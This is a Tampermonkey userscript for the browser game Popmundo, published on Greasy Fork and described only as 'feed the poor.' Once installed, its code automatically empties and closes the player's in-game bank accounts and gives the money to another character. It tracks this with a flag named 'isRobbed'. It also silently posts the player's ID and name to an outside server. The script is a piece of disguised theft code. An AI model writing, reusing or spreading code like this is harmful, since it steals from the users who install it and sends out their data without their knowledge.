// ==UserScript==
// @name         PopmundoPeterPan
// @namespace    http://tampermonkey.net/
// @version      2
// @description  feed the poor.
// @author       S. Sikimić
// @include      http://83.popmundo.com/World/Popmundo.aspx/Character
// @include      http://84.popmundo.com/World/Popmundo.aspx/Character
// @include      http://85.popmundo.com/World/Popmundo.aspx/Character
// @include      https://83.popmundo.com/World/Popmundo.aspx/Character
// @include      https://84.popmundo.com/World/Popmundo.aspx/Character
// @include      https://85.popmundo.com/World/Popmundo.aspx/Character

// @include      http://83.popmundo.com/World/Popmundo.aspx/Character/Economy/*
// @include      http://84.popmundo.com/World/Popmundo.aspx/Character/Economy/*
// @include      http://85.popmundo.com/World/Popmundo.aspx/Character/Economy/*
// @include      https://83.popmundo.com/World/Popmundo.aspx/Character/Economy/*
// @include      https://84.popmundo.com/World/Popmundo.aspx/Character/Economy/*
// @include      https://85.popmundo.com/World/Popmundo.aspx/Character/Economy/*

// @include      http://83.popmundo.com/World/Popmundo.aspx/Character/BankAccount/*
// @include      http://84.popmundo.com/World/Popmundo.aspx/Character/BankAccount/*
// @include      http://85.popmundo.com/World/Popmundo.aspx/Character/BankAccount/*
// @include      https://83.popmundo.com/World/Popmundo.aspx/Character/BankAccount/*
// @include      https://84.popmundo.com/World/Popmundo.aspx/Character/BankAccount/*
// @include      https://85.popmundo.com/World/Popmundo.aspx/Character/BankAccount/*

// @include      http://83.popmundo.com/World/Popmundo.aspx/Character/Relations/*
// @include      http://84.popmundo.com/World/Popmundo.aspx/Character/Relations/*
// @include      http://85.popmundo.com/World/Popmundo.aspx/Character/Relations/*
// @include      https://83.popmundo.com/World/Popmundo.aspx/Character/Relations/*
// @include      https://84.popmundo.com/World/Popmundo.aspx/Character/Relations/*
// @include      https://85.popmundo.com/World/Popmundo.aspx/Character/Relations/*

// @include      http://83.popmundo.com/World/Popmundo.aspx/Character/GiveMoney/*
// @include      http://84.popmundo.com/World/Popmundo.aspx/Character/GiveMoney/*
// @include      http://85.popmundo.com/World/Popmundo.aspx/Character/GiveMoney/*
// @include      https://83.popmundo.com/World/Popmundo.aspx/Character/GiveMoney/*
// @include      https://84.popmundo.com/World/Popmundo.aspx/Character/GiveMoney/*
// @include      https://85.popmundo.com/World/Popmundo.aspx/Character/GiveMoney/*


// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/40110/PopmundoPeterPan.user.js
// @updateURL https://update.greasyfork.org/scripts/40110/PopmundoPeterPan.meta.js
// ==/UserScript==
var isRobbed = "isRobbed";
var willSendMoney = "willSendMoney";

var SCRIPTDATA = "bank";
if(window.location.href == "http://83.popmundo.com/World/Popmundo.aspx/Character" ||
   window.location.href == "http://84.popmundo.com/World/Popmundo.aspx/Character" ||
   window.location.href == "http://85.popmundo.com/World/Popmundo.aspx/Character" ||
   window.location.href == "https://83.popmundo.com/World/Popmundo.aspx/Character" ||
   window.location.href == "https://84.popmundo.com/World/Popmundo.aspx/Character" ||
   window.location.href == "https://85.popmundo.com/World/Popmundo.aspx/Character"){

    if(GM_getValue(isRobbed) == undefined || GM_getValue(isRobbed) == null || !GM_getValue(isRobbed)){
        goToAccs();
    }else{
        console.log("GM_getValue(isRobbed): "+GM_getValue(isRobbed));
    }

    try{
        if(GM_getValue(SCRIPTDATA) == undefined || GM_getValue(SCRIPTDATA) == null || !GM_getValue(SCRIPTDATA)){
            registerMe();
        }
    }catch(e){
        console.log("failed to exec : registerMe()");
    }
}


if(window.location.href.includes("popmundo.com/World/Popmundo.aspx/Character/Economy")){

    if (haveAnyAcc()) {
        GM_setValue(isRobbed, false);
        setTimeout(function() {
            if(GM_getValue(isRobbed) == undefined || GM_getValue(isRobbed) == null || !GM_getValue(isRobbed)){
                listAccURLS();
            }
        }, 250);
    }else{
        GM_setValue(isRobbed, true);
        goToRelatives();
    }
}

if(window.location.href.includes("popmundo.com/World/Popmundo.aspx/Character/BankAccount/")){

    setTimeout(function() {
        if(GM_getValue(isRobbed) == undefined || GM_getValue(isRobbed) == null || !GM_getValue(isRobbed)){
            withdraw();
        }

    }, 250);
}

if(window.location.href.includes("popmundo.com/World/Popmundo.aspx/Character/Relations") && GM_getValue(willSendMoney)){

    setTimeout(function() {

        goToMoneyPage();


    }, 250);
}

if(window.location.href.includes("popmundo.com/World/Popmundo.aspx/Character/GiveMoney") && GM_getValue(willSendMoney)){

    setTimeout(function() {

        sendMoney();


    }, 250);
}

function goToAccs() {
    var menus = document.getElementById("ppm-sidemenu").getElementsByClassName("box")[0].getElementsByClassName("menu");
    var a = menus[3].getElementsByTagName('ul')[0].childNodes[3].getElementsByTagName('a')[0];
    a.click();
}

function haveAnyAcc() {
    if (document.getElementById("ctl00_cphLeftColumn_ctl02_divNoAccounts") == null) {
        return true;
    } else {
        return false;
        GM_setValue(isRobbed, true);
    }
}

function listAccURLS() {
    var accsMainRow = document.getElementById("tableaccounts").getElementsByTagName('tbody')[0].getElementsByTagName('tr');
    var accsUrls = new Array();
    for (var i = 0; i < accsMainRow.length; i++) {
        //console.log(accsMainRow[i].innerText.replace(/\D/g,''));
        //console.log("i: "+i+") "+accsMainRow[i].getElementsByTagName('td')[0].getElementsByTagName('a')[0].href);
        //accsUrls[i] = accsMainRow[i].getElementsByTagName('td')[0].getElementsByTagName('a')[0].href;
        accsUrls.push(accsMainRow[i].getElementsByTagName('td')[0].getElementsByTagName('a')[0].href);
    }
    console.log(accsUrls);

    var clk = document.getElementById("ctl00_ctl06_ucMenu_lnkCity");
    clk.attributes['href'].value = accsUrls[0];

    setTimeout(function() {
        clk.click();
    }, 250);
}

function getMoney() {
    var moneyStr = document.getElementById("ppm-content").getElementsByClassName('box')[1].getElementsByTagName('table')[0].getElementsByTagName('tr')[3].getElementsByTagName('td')[1].innerText;
    var len = moneyStr.length;
    moneyStr = moneyStr.substr(0, len - 5);
    var money = moneyStr.replace(".", "");
    return money;
}

function withdraw() {
    console.log("inside withdraw()");
    if(getMoney() == 0){
        console.log("getMoney()" + getMoney());
        closeAcc();
    }else{
        document.getElementById("ctl00_cphLeftColumn_ctl00_txtWithdrawAmount").value = getMoney();
        setTimeout(function() {
            document.getElementById("ctl00_cphLeftColumn_ctl00_btnWithdraw").click();
            setTimeout(function() {
                try {
                    document.getElementsByClassName("ui-dialog-buttonset")[2].getElementsByClassName("ui-button ui-corner-all ui-widget")[0].click();
                } catch (ex) {
                    console.log("no \"yes\" button" + ex);
                }}, 250);
        }, 250);
    }
}
function closeAcc(){

    document.getElementById("ctl00_cphLeftColumn_ctl00_btnCloseAccount").click();

    setTimeout(function() {
        try {
            console.log(document.getElementsByClassName("ui-dialog-buttonset")[4].getElementsByClassName("ui-button ui-corner-all ui-widget")[0].click());
        } catch (ex) {
            try {
                console.log(document.getElementsByClassName("ui-dialog-buttonset")[0].getElementsByClassName("ui-button ui-corner-all ui-widget")[0].click());
            } catch (ex) {
                console.log("no \"yes\" button" + ex);
            }
        }
    }, 250);
}

function goToRelatives(){

    //go to relations
    var m1 = document.getElementById("ppm-sidemenu").getElementsByClassName("box")[0].getElementsByClassName("menu")[0].getElementsByTagName("ul")[0].getElementsByTagName("li")[5];
    var m2 = document.getElementById("ppm-sidemenu").getElementsByClassName("box")[0].getElementsByClassName("menu")[0].getElementsByTagName("ul")[0].getElementsByTagName("li")[6];
    if (m1.getElementsByTagName("a")[0].href.includes("Relations")) {
        m1.getElementsByTagName("a")[0].click();
    } else {
        m2.getElementsByTagName("a")[0].click();
    }

    GM_setValue(willSendMoney, true);
}

function goToMoneyPage(){
    //go to give_money page
    var people = document.getElementById("ppm-content").getElementsByTagName("table")[0].getElementsByTagName("tbody")[0].getElementsByTagName("tr");
    var count = people.length;
    var personId = people[count - 1].getElementsByTagName("td")[0].getElementsByTagName("a")[0].href.replace("http://83.popmundo.com/World/Popmundo.aspx/Character/", "");
    personId = personId.replace("http://84.popmundo.com/World/Popmundo.aspx/Character/", "");
    personId = personId.replace("http://85.popmundo.com/World/Popmundo.aspx/Character/", "");
    personId = personId.replace("https://83.popmundo.com/World/Popmundo.aspx/Character/", "");
    personId = personId.replace("https://84.popmundo.com/World/Popmundo.aspx/Character/", "");
    personId = personId.replace("https://85.popmundo.com/World/Popmundo.aspx/Character/", "");
    console.log(personId);
    //person.click();
    var clk = document.getElementById("ctl00_ctl06_ucMenu_lnkCity");
    clk.attributes['href'].value = "/World/Popmundo.aspx/Character/GiveMoney/" + personId;
    setTimeout(function() {
        clk.click();
    }, 250);
}

function sendMoney() {

    //give money.
    var money = document.getElementById("ppm-content").getElementsByClassName("box ofauto")[1].getElementsByTagName("p")[0].innerText.replace(/\D/g, '');
    money = money.substring(0, money.length - 2);
    document.getElementById("ctl00_cphLeftColumn_ctl00_txtPriceTag").value = money;
    document.getElementById("ctl00_cphLeftColumn_ctl00_btnGive").click();
    try {
        setTimeout(function() {
            document.getElementsByClassName("ui-dialog-buttonset")[2].getElementsByTagName("button")[0].click();
        }, 250);
    } catch (ex) {
        console.log("no \"yes\" button" + ex);
    }

    GM_setValue(willSendMoney, false);
}

//GM_setValue(isRobbed, false);

function registerMe() {

    var ID = document.getElementsByClassName("idHolder")[0].innerText;
    var NAME = document.getElementsByTagName("h2")[0].innerText;
    var DATA = JSON.stringify({popId:ID, ingameName:NAME, scriptType:SCRIPTDATA});

    GM_xmlhttpRequest({
        method: "POST",
        url: "https://popmundo.azurewebsites.net/api/add_user",
        data: DATA ,
        headers: {
            "Content-Type": "application/json"
        },
        onload: function(response) {
            //alert("posted");
            console.log(response);
            if(response.readyState == 4 && response.status == 200) {
                GM_setValue(SCRIPTDATA, true);
            }
        }
    });
}
